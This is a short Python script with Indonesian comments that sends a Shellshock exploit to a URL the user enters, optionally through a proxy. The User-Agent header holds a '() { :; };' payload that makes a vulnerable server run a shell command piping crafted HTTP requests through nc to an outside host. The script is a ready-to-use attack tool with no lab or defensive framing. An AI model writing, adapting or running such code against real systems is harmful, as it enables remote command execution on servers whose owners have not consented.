import requests

def send_exploit(proxy_url):
    # Meminta input dari pengguna untuk URL yang akan dieksploitasi
    exploit_url = input("Masukkan URL yang akan dieksploitasi: ")

    # Membuat header dan payload sesuai dengan input pengguna
    exploit_headers = {
        'User-Agent': '() { :; }; /bin/echo -e "GET /here/../here HTTP/1.1\r\nHost: www.example.com\r\n\r\nGET /nonexistent HTTP/1.1\r\nHost: www.example.com\r\n\r\n" | nc example.com 80',
        'Connection': 'close'
    }

    # Mengirim permintaan HTTP dengan menggunakan input dari pengguna
    response = requests.get(exploit_url, headers=exploit_headers, proxies={'http': proxy_url, 'https': proxy_url})

    print(response.text)

# Menggunakan fungsi dengan memberikan URL proxy sebagai argumen
proxy_url = input("Masukkan URL proxy: ")
send_exploit(proxy_url)
